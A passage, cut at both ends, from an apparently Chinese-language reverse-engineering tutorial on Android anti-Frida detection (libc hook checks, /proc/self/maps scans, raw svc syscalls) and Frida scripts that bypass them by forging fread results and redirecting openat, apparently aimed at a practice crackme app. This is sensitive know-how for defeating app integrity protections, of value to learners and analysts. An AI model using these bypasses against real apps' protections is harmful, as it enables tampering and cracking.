class="hljs-type">const</span> <span class="hljs-type">char</span> *lib_path;  <br>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __LP64__  </span><br>    lib_path = <span class="hljs-string">&quot;/system/lib64/libc.so&quot;</span>;  <br>    <span class="hljs-meta">#<span class="hljs-keyword">else</span>  </span><br>    lib_path = <span class="hljs-string">&quot;/system/lib/libc.so&quot;</span>;  <br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>  <br>    <span class="hljs-comment">// 定义要比较的字节数  </span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> CMP_COUNT = <span class="hljs-number">8</span>;  <br>    <span class="hljs-comment">// 指定要查找的符号名，这里是&quot;open&quot;函数  </span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *sym_name = <span class="hljs-string">&quot;open&quot;</span>;  <br>  <br>    <span class="hljs-comment">// 使用local_dlopen函数打开指定的共享库，并获取操作句柄  </span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">local_dlfcn_handle</span> *handle = <span class="hljs-built_in">static_cast</span>&lt;local_dlfcn_handle *&gt;(<span class="hljs-built_in">local_dlopen</span>(lib_path));  <br>    <span class="hljs-keyword">if</span> (!handle) &#123;  <br>        <span class="hljs-keyword">return</span> JNI_FALSE; <span class="hljs-comment">// 如果无法打开共享库，返回false  </span><br>    &#125;  <br>  <br>    <span class="hljs-comment">// 获取&quot;open&quot;函数在libc.so中的偏移量  </span><br>    <span class="hljs-type">off_t</span> offset = <span class="hljs-built_in">local_dlsym</span>(handle, sym_name);  <br>  <br>    <span class="hljs-comment">// 关闭handle，因为我们接下来使用标准的dlopen/dlsy来获取函数地址  </span><br>    <span class="hljs-built_in">local_dlclose</span>(handle);  <br>  <br>    <span class="hljs-comment">// 打开libc.so文件，准备读取数据  </span><br>    FILE *fp = <span class="hljs-built_in">fopen</span>(lib_path, <span class="hljs-string">&quot;rb&quot;</span>);  <br>    <span class="hljs-keyword">if</span> (!fp) &#123;  <br>        <span class="hljs-keyword">return</span> JNI_FALSE; <span class="hljs-comment">// 如果无法打开文件，返回false  </span><br>    &#125;  <br>  <br>    <span class="hljs-comment">// 定义一个缓冲区，用于存储读取的文件内容  </span><br>    <span class="hljs-type">char</span> file_bytes[CMP_COUNT] = &#123;<span class="hljs-number">0</span>&#125;;  <br>    <span class="hljs-comment">// 读取指定偏移量处的CMP_COUNT个字节  </span><br>    <span class="hljs-built_in">fseek</span>(fp, offset, SEEK_SET);  <br>    <span class="hljs-built_in">fread</span>(file_bytes, <span class="hljs-number">1</span>, CMP_COUNT, fp);  <br>    <span class="hljs-built_in">fclose</span>(fp);  <br>  <br>    <span class="hljs-comment">// 使用dlopen函数打开libc.so共享库，并获取操作句柄  </span><br>    <span class="hljs-type">void</span> *dl_handle = <span class="hljs-built_in">dlopen</span>(lib_path, RTLD_NOW);  <br>    <span class="hljs-keyword">if</span> (!dl_handle) &#123;  <br>        <span class="hljs-keyword">return</span> JNI_FALSE; <span class="hljs-comment">// 如果无法打开共享库，返回false  </span><br>    &#125;  <br>  <br>    <span class="hljs-comment">// 使用dlsym函数获取&quot;open&quot;函数的地址  </span><br>    <span class="hljs-type">void</span> *sym = <span class="hljs-built_in">dlsym</span>(dl_handle, sym_name);  <br>    <span class="hljs-keyword">if</span> (!sym) &#123;  <br>        <span class="hljs-built_in">dlclose</span>(dl_handle);  <br>        <span class="hljs-keyword">return</span> JNI_FALSE; <span class="hljs-comment">// 如果无法找到符号，返回false  </span><br>    &#125;  <br>  <br>    <span class="hljs-comment">// 比较原libc.so中的&quot;open&quot;函数内容与通过dlsym获取的&quot;open&quot;函数内容是否一致  </span><br>    <span class="hljs-type">int</span> is_hook = <span class="hljs-built_in">memcmp</span>(file_bytes, sym, CMP_COUNT) != <span class="hljs-number">0</span>;  <br>  <br>    <span class="hljs-comment">// 关闭dlopen打开的共享库句柄  </span><br>    <span class="hljs-built_in">dlclose</span>(dl_handle);  <br>  <br>    <span class="hljs-comment">// 返回比较结果，如果函数被hook则返回JNI_TRUE，否则返回JNI_FALSE  </span><br>    <span class="hljs-keyword">return</span> is_hook ? JNI_TRUE : JNI_FALSE;  <br>&#125;  <br>  <br></code></pre></td></tr></table></figure><p><code>获取hook前字节码的脚本</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bytes_count = <span class="hljs-number">8</span>  <br><span class="hljs-keyword">let</span> address = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;open&quot;</span>)  <br>  <br><span class="hljs-keyword">let</span> before = <span class="hljs-title function_">ptr</span>(address)  <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>)  <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] before hook: &quot;</span>)  <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(before, &#123;  <br>    <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,  <br>    <span class="hljs-attr">length</span>: bytes_count,  <br>    <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,  <br>    <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span>  <br>  &#125;));  <br>  <br></code></pre></td></tr></table></figure><p><code>anti脚本</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_memcmp_addr</span>(<span class="hljs-params"></span>)&#123;  <br>    <span class="hljs-comment">//hook反调试  </span><br>    <span class="hljs-keyword">var</span> memcmp_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fread&quot;</span>);  <br>    <span class="hljs-keyword">if</span> (memcmp_addr !== <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;fread address: &quot;</span>, memcmp_addr);  <br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(memcmp_addr, &#123;  <br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;  <br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = args[<span class="hljs-number">0</span>];   <span class="hljs-comment">// 保存 buffer 参数  </span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = args[<span class="hljs-number">1</span>];     <span class="hljs-comment">// 保存 size 参数  </span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = args[<span class="hljs-number">2</span>];    <span class="hljs-comment">// 保存 count 参数  </span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">stream</span> = args[<span class="hljs-number">3</span>];   <span class="hljs-comment">// 保存 FILE* 参数  </span><br>        &#125;,  <br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;  <br>            <span class="hljs-comment">// 这里可以修改 buffer 的内容，假设我们知道何时 fread 被用于敏感操作  </span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>());  <br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">8</span>) &#123;  <br>                <span class="hljs-comment">// 模拟 fread 读取了预期数据，伪造返回值  </span><br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>, [<span class="hljs-number">0x50</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xd6</span>]);  <br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">// 填充前8字节  </span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>));  <br>            &#125;  <br>        &#125;  <br>    &#125;);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error: memcmp function not found in libc.so&quot;</span>);  <br>    &#125;  <br>&#125;  <br>  <br></code></pre></td></tr></table></figure><p><code>Syscall&amp;SVC&amp;自定义strstr</code></p><p>在用户空间和内核空间之间，有一个叫做Syscall(系统调用, system call)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。<br><strong>SVC(软件中断指令)指令</strong>：在ARM架构的系统中，<code>svc</code>是一条特殊的指令，它允许用户态的程序发起一个系统调用。当这条指令被执行时，CPU会从用户态切换到内核态，从而允许内核处理这个请求。</p><p>Linux操作系统是一个巨大的图书馆，而<code>syscall</code>就是这个图书馆的前台服务窗口。当一个应用程序（比如一个读者）需要借阅书籍（获取系统资源或服务）时，它不能直接进入图书馆的内部书架去拿书，因为那样可能会造成混乱和损坏。所以，读者需要通过前台服务窗口，也就是<code>syscall</code>，来请求它想要的书籍。</p><p><code>svc</code>就像是图书馆前台服务窗口的内部电话。当读者通过前台窗口提出请求时，前台工作人员会通过内部电话（<code>svc</code>）来联系图书馆的内部工作人员，请求他们找到并提供所需的书籍。在Linux系统中，当一个程序通过<code>syscall</code>请求服务时，实际上是通过<code>svc</code>这条指令通知内核，然后由内核来处理这些请求。</p><p><img src="informatin/book/笔记/照片/0.png"></p><ul><li><p>首先当我们长按开机键（电源按钮）开机，此时会引导芯片开始从固化到ROM中的预设代码处执行，然后加载引导程序到RAM。然后启动加载的引导程序，引导程序主要做一些基本的检查，包括RAM的检查，初始化硬件的参数。</p></li><li><p>到达内核层的流程后，这里初始化一些进程管理、内存管理、加载各种Driver等相关操作，如Camera Driver、Binder Driver 等。下一步就是内核线程，如软中断线程、内核守护线程。下面一层就是Native层，这里额外提一点知识，层于层之间是不可以直接通信的，所以需要一种中间状态来通信。Native层和Kernel层之间通信用的是syscall，Native层和Java层之间的通信是JNI。</p></li><li><p>在Native层会初始化init进程，也就是用户组进程的祖先进程。init中加载配置文件init.rc，init.rc中孵化出ueventd、logd、healthd、installd、lmkd等用户守护进程。开机动画启动等操作。核心的一步是孵化出Zygote进程，此进程是所有APP的父进程，这也是Xposed注入的核心，同时也是Android的第一个Java进程（虚拟机进程）。</p></li><li><p>进入框架层后，加载zygote init类，注册zygote socket套接字，通过此套接字来做进程通信，并加载虚拟机、类、系统资源等。zygote第一个孵化的进程是system_server进程，负责启动和管理整个Java Framework，包含ActivityManager、PowerManager等服务。</p></li><li><p>应用层的所有APP都是从zygote孵化而来</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">bool <span class="hljs-title function_">anti_anti_maps</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-comment">// 定义一个足够大的字符数组line，用于存储读取的行  </span><br>    const <span class="hljs-type">int</span> <span class="hljs-variable">buf_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">512</span>;  <br>    <span class="hljs-type">char</span> buf[buf_size];  <br>    <span class="hljs-type">int</span> fd;  <span class="hljs-comment">// 文件描述符  </span><br>    <span class="hljs-comment">// 使用 my_openat 打开当前进程的内存映射文件 /proc/self/maps 进行读取  </span><br>    <span class="hljs-comment">// AT_FDCWD 表示当前工作目录，&quot;r&quot; 表示只读方式打开  </span><br>    fd = my_openat(AT_FDCWD, <span class="hljs-string">&quot;/proc/self/maps&quot;</span>, O_RDONLY | O_CLOEXEC, <span class="hljs-number">0</span>);  <br>    <span class="hljs-keyword">if</span> (fd != -<span class="hljs-number">1</span>) &#123;  <br>        <span class="hljs-comment">// 如果文件成功打开，循环读取每一行  </span><br>        <span class="hljs-keyword">while</span> ((read_line(fd, buf, buf_size)) &gt; <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-comment">// 使用strstr函数检查当前行是否包含&quot;frida&quot;字符串  </span><br>            <span class="hljs-keyword">if</span> (strstr(buf, <span class="hljs-string">&quot;frida&quot;</span>) || strstr(buf, <span class="hljs-string">&quot;gadget&quot;</span>)) &#123;  <br>                <span class="hljs-comment">// 如果找到了&quot;frida&quot;，关闭文件并返回true，表示检测到了恶意库  </span><br>                close(fd);  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// Evil library is loaded.  </span><br>            &#125;  <br>        &#125;  <br>        <span class="hljs-comment">// 遍历完文件后，关闭文件  </span><br>        close(fd);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-comment">// 如果无法打开文件，记录错误。这可能意味着系统状态异常  </span><br>        <span class="hljs-comment">// 注意：这里的代码没有处理错误，只是注释说明了可能的情况  </span><br>    &#125;  <br>    <span class="hljs-comment">// 如果没有在内存映射文件中找到&quot;frida&quot;，返回false，表示没有检测到恶意库  </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// No evil library detected.  </span><br>&#125;  <br>  <br>ENTRY(my_openat)  <span class="hljs-comment">// 定义函数入口，标签my_openat  </span><br>    mov     x8, __NR_openat  <span class="hljs-comment">// 将openat系统调用号（__NR_openat）移动到x8寄存器，x8用于存储系统调用号  </span><br>    svc     #<span class="hljs-number">0</span>               <span class="hljs-comment">// 触发系统调用异常，进入操作系统执行系统调用  </span><br>    cmn     x0, #(MAX_ERRNO + <span class="hljs-number">1</span>)  <span class="hljs-comment">// 将函数返回值（存储在x0寄存器）与MAX_ERRNO + 1进行无符号比较  </span><br>    cneg    x0, x0, hi       <span class="hljs-comment">// 如果上面的比较结果大于或等于零（即没有错误），则将x0的符号位取反（如果原来是负则变正）  </span><br>    b.hi    __set_errno_internal  <span class="hljs-comment">// 如果上面的比较结果大于或等于零（即发生了错误），则跳转到__set_errno_internal进行错误处理  </span><br>    ret                       <span class="hljs-comment">// 从函数返回，继续执行调用者代码  </span><br>END(my_openat)  <span class="hljs-comment">// 标记函数结束  </span><br></code></pre></td></tr></table></figure><p><code>anti脚本</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">anti_svc</span>(<span class="hljs-params"></span>)&#123;  <br>    <span class="hljs-keyword">let</span> target_code_hex;  <span class="hljs-comment">// 用于搜索特定汇编指令序列的十六进制字符串  </span><br>    <span class="hljs-keyword">let</span> call_number_openat;  <span class="hljs-comment">// 系统调用号对应的数值，openat  </span><br>    <span class="hljs-keyword">let</span> arch = <span class="hljs-title class_">Process</span>.<span class="hljs-property">arch</span>;  <span class="hljs-comment">// 获取当前进程的架构  </span><br>  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;arm&quot;</span> === arch)&#123;  <span class="hljs-comment">// 如果架构是ARM  </span><br>        target_code_hex = <span class="hljs-string">&quot;00 00 00 EF&quot;</span>;  <span class="hljs-comment">// ARM架构下svc指令的十六进制表示  </span><br>        call_number_openat = <span class="hljs-number">322</span>;  <span class="hljs-comment">// openat在ARM架构中的系统调用号  </span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;arm64&quot;</span> === arch)&#123;  <span class="hljs-comment">// 如果架构是ARM64  </span><br>        target_code_hex = <span class="hljs-string">&quot;01 00 00 D4&quot;</span>;  <span class="hljs-comment">// ARM64架构下svc指令的十六进制表示  </span><br>        call_number_openat = <span class="hljs-number">56</span>;  <span class="hljs-comment">// openat在ARM64架构中的系统调用号  </span><br>    &#125;<span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arch not support!&quot;</span>);  <span class="hljs-comment">// 如果架构不支持，打印错误信息  </span><br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (arch)&#123;  <span class="hljs-comment">// 如果成功获取了架构信息  </span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nthe_arch = &quot;</span> + arch);  <span class="hljs-comment">// 打印当前架构  </span><br>        <span class="hljs-comment">// 枚举进程的内存范围，寻找只读内存段  </span><br>        <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateRanges</span>(<span class="hljs-string">&#x27;r--&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">range</span>) &#123;  <br>            <span class="hljs-keyword">if</span>(!range.<span class="hljs-property">file</span> || !range.<span class="hljs-property">file</span>.<span class="hljs-property">path</span>)&#123;  <span class="hljs-comment">// 如果内存段没有文件路径，跳过  </span><br>                <span class="hljs-keyword">return</span>;  <br>            &#125;  <br>            <span class="hljs-keyword">let</span> path = range.<span class="hljs-property">file</span>.<span class="hljs-property">path</span>;  <span class="hljs-comment">// 获取内存段的文件路径  </span><br>            <span class="hljs-comment">// 如果文件路径不是以&quot;/data/app/&quot;开头或不以&quot;.so&quot;结尾，跳过  </span><br>            <span class="hljs-keyword">if</span> ((!path.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/data/app/&quot;</span>)) || (!path.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;.so&quot;</span>)))&#123;  <br>                <span class="hljs-keyword">return</span>;  <br>            &#125;  <br>            <span class="hljs-keyword">let</span> baseAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getBaseAddress</span>(path);  <span class="hljs-comment">// 获取so库的基址  </span><br>            <span class="hljs-keyword">let</span> soNameList = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;/&quot;</span>);  <span class="hljs-comment">// 通过路径分割获取so库的名称  </span><br>            <span class="hljs-keyword">let</span> soName = soNameList[soNameList.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];  <span class="hljs-comment">// 获取so库的名称  </span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\npath = &quot;</span> + path + <span class="hljs-string">&quot; , baseAddress = &quot;</span> + baseAddress +  <br>                        <span class="hljs-string">&quot; , rangeAddress = &quot;</span> + range.<span class="hljs-property">base</span> + <span class="hljs-string">&quot; , size = &quot;</span> + range.<span class="hljs-property">size</span>);  <br>            <span class="hljs-comment">// 在so库的内存范围内搜索target_code_hex对应的指令序列  </span><br>            <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">scan</span>(range.<span class="hljs-property">base</span>, range.<span class="hljs-property">size</span>, target_code_hex, &#123;  <br>                <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">match</span>)&#123;  <br>                    <span class="hljs-keyword">let</span> code_address = match;  <span class="hljs-comment">// 获取匹配到的指令地址  </span><br>                    <span class="hljs-keyword">let</span> code_address_str = code_address.<span class="hljs-title function_">toString</span>();  <span class="hljs-comment">// 转换为字符串  </span><br>                    <span class="hljs-comment">// 如果地址的最低位是0, 4, 8, c中的任意一个，说明可能是svc指令  </span><br>                    <span class="hljs-keyword">if</span> (code_address_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;0&quot;</span>) || code_address_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;4&quot;</span>) ||  <br>                        code_address_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;8&quot;</span>) || code_address_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;c&quot;</span>))&#123;  <br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;--------------------------&quot;</span>);  <br>                        <span class="hljs-keyword">let</span> call_number = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化系统调用号  </span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;arm&quot;</span> === arch)&#123;  <br>                            <span class="hljs-comment">// 获取svc指令后面的立即数，作为系统调用号  </span><br>                            call_number = (code_address.<span class="hljs-title function_">sub</span>(<span class="hljs-number">0x4</span>).<span class="hljs-title function_">readS32</span>()) &amp; <span class="hljs-number">0xFFF</span>;  <br>                        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;arm64&quot;</span> === arch)&#123;  <br>                            call_number = (code_address.<span class="hljs-title function_">sub</span>(<span class="hljs-number">0x4</span>).<span class="hljs-title function_">readS32</span>() &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xFFFF</span>;  <br>                        &#125;<span class="hljs-keyword">else</span> &#123;  <br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;the arch get call_number not support!&quot;</span>);  <span class="hljs-comment">// 如果架构不支持，打印错误信息  </span><br>                        &#125;  <br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;find svc : so_name = &quot;</span> + soName + <span class="hljs-string">&quot; , address = &quot;</span> + code_address +  <br>                                    <span class="hljs-string">&quot; , call_number = &quot;</span> + call_number + <span class="hljs-string">&quot; , offset = &quot;</span> + code_address.<span class="hljs-title function_">sub</span>(baseAddress));  <br>                        <span class="hljs-comment">// 如果匹配到的系统调用号是openat，挂钩该地址  </span><br>                        <span class="hljs-keyword">if</span> (call_number_openat === call_number)&#123;  <br>                            <span class="hljs-keyword">let</span> target_hook_addr = code_address;  <br>                            <span class="hljs-keyword">let</span> target_hook_addr_offset = target_hook_addr.<span class="hljs-title function_">sub</span>(baseAddress);  <br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;find svc openat , start inlinehook by frida!&quot;</span>);  <br>                            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(target_hook_addr, &#123;  <br>                                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">// 当进入挂钩函数时  </span><br>                                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nonEnter_&quot;</span> + target_hook_addr_offset + <span class="hljs-string">&quot; , __NR_openat , args[1] = &quot;</span> +  <br>                                                  args[<span class="hljs-number">1</span>].<span class="hljs-title function_">readCString</span>());  <br>                                    <span class="hljs-comment">// 修改openat的第一个参数为指定路径  </span><br>                                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">new_addr</span> = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-string">&quot;/data/user/0/com.zj.wuaipojie/maps&quot;</span>);  <br>                                    args[<span class="hljs-number">1</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">new_addr</span>;  <br>                                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;onEnter_&quot;</span> + target_hook_addr_offset + <span class="hljs-string">&quot; , __NR_openat , args[1] = &quot;</span> +  <br>                                                  args[<span class="hljs-number">1</span>].<span class="hljs-title function_">readCString</span>());  <br>                                &#125;,  <br>                                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">// 当离开挂钩函数时  </span><br>                                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;onLeave_&quot;</span> + target_hook_addr_offset + <span class="hljs-string">&quot; , __NR_openat , retval = &quot;</span> + retval)  <br>                                &#125;  <br>                            &#125;);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;,  <br>                <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;&#125;  <span class="hljs-comment">// 搜索完成后的回调函数  </span><br>            &#125;);  <br>        &#125;);  <br>    &#125;  <br>&#125;  <br></code></pre></td></tr></table></figure><p><code>自定义strstr</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">anti_str_maps</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-comment">// 定义一个足够大的字符数组line，用于存储读取的行  </span><br>    <span class="hljs-type">char</span> line[<span class="hljs-number">512</span>];  <br>    <span class="hljs-comment">// 打开当前进程的内存映射文件/proc/self/maps进行读取  </span><br>    FILE* fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);  <br>    <span class="hljs-keyword">if</span> (fp) 